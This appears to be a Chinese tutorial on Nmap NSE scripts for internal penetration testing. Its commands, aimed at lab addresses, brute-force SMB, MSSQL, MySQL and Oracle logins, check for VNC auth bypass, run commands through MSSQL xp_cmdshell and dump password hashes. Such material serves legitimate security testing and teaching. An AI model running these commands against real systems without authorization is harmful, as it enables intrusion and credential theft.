## **0x00 前言**

* * *

本文主要讲解nmap的众多脚本的使用，在内网渗透的时候尤其好用。

## **0x01 nmap按脚本分类扫描**

* * *

nmap脚本主要分为以下几类，在扫描时可根据需要设置--script=类别这种方式进行比较笼统的扫描：

```


auth: 负责处理鉴权证书（绕开鉴权）的脚本
```

部分使用截图：

（1） `nmap --script=auth 192.168.137.*`

负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令

![](../Images/d6f45e59c17478417bae9746de56c21c.png)

![](../Images/1ff648277814af75384337087514e222.png)

（2）`nmap --script=brute 192.168.137.*`

提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解

![](../Images/70a75d2b3d044080bbe8b3ab80702e59.png)

（3）`nmap --script=default 192.168.137.*` 或者 `nmap -sC 192.168.137.*`

默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击

![](../Images/5abece69bd97bca13db263f258f19711.png)

![](../Images/4aecc0af33da518929e4da93753991b2.png)

（4）`nmap --script=vuln 192.168.137.*`    

检查是否存在常见漏洞

![](../Images/6a555efc1805f271cc384cf20d41b942.png)

![](../Images/82093949d88b8fc96ec4e441c3e48a28.png)

![](../Images/c1dd77f542833ec8e0709d00294aa211.png)

（5）`nmap -n -p445 --script=broadcast 192.168.137.4`

在局域网内探查更多服务开启状况

![](../Images/936a7abc248694c5b58460b1c2606595.png)

（6）`nmap --script external 202.103.243.110` 

利用第三方的数据库或资源，例如进行whois解析

![](../Images/dbe752c50f3a35f8dd0301d5311a1d0d.png)

## **0x02 nmap按应用服务扫描**

**（1）vnc扫描：**

检查vnc bypass

```

nmap  --script=realvnc-auth-bypass 192.168.137.4  
```

![](../Images/341fc7be6757b2fe5d73c77ea2ce3940.png)

![](../Images/eda64022a1dd90b01a6a3b83281b11f0.png)

检查vnc认证方式

```

nmap  --script=vnc-auth  192.168.137.4  
```

获取vnc信息

```

nmap  --script=vnc-info  192.168.137.4  
```

**（2）smb扫描：**

smb破解

```

nmap  --script=smb-brute.nse 192.168.137.4  
```

smb字典破解

```

nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4  
```

![](../Images/e62baa8ff20b8633a70334f27ec4ec21.png)

smb已知几个严重漏

```

nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4    
```

![](../Images/b46871923d44839850dc6da44ba2a36c.png)

查看共享目录  

```

nmap -p 445  --script smb-ls --script-args ‘share=e$,path=\\,smbuser=test,smbpass=test’ 192.168.137.4    
```

查询主机一些敏感信息（注：需要下载nmap\_service）

```

nmap -p 445 -n –script=smb-psexec --script-args= smbuser=test,smbpass=test 192.168.137.4   
```

![](../Images/246cbe8f61b6bc089d02d1c69f61d677.png)

查看会话

```

nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=test,smbpass=test 192.168.137.4    
```

系统信息

```

nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=test,smbpass=test 192.168.137.4  
```

**（3）Mssql扫描：**

猜解mssql用户名和密码

```

nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4  
```

![](../Images/bce6805edd7403a6f9e65d9a6330a60b.png)

xp\_cmdshell 执行命令 

```

nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user" 192.168.137.4      
```

![](../Images/9aded65b2f2dfe9723799e55ff7a6b78.png)

dumphash值

```

nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mssql.password=sa  192.168.137.4      
```

![](../Images/f7a95d2ab5b1a810c87673479e90037c.png)

**（4）Mysql扫描：**

扫描root空口令

```

nmap -p3306 --script=mysql-empty-password.nse 192.168.137.4   
```

![](../Images/2fec43ec67a42705d8ae1fecaaade97f.png)

列出所有mysql用户

```

nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4   
```

支持同一应用的所有脚本扫描

```

nmap --script=mysql-\* 192.168.137.4  
```

![](../Images/92377ce9e31d1f8cedaba23eaf57127b.png)

**（5）Oracle扫描：**

**oracle sid扫描**

```

nmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5  
```

![](../Images/9f782fd07cb53d8a3bbede50eba3b58e.png)

**oracle弱口令破解**

```

nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5      
```

![](../Images/d7dbc060b8aadf6cb8f41ad798828023.png)

**（6）其他一些比较好用的脚本**

```


nmap --script=broadcast-netbios-master-browser 192.168.137.4   发现网关
```

**（7）不靠谱的脚本：**

vnc-brute    次数多了会禁止连接

pcanywhere-brute   同上

![](../Images/1171ece5fdcfe97553e1d09ae58ba6ca.png)
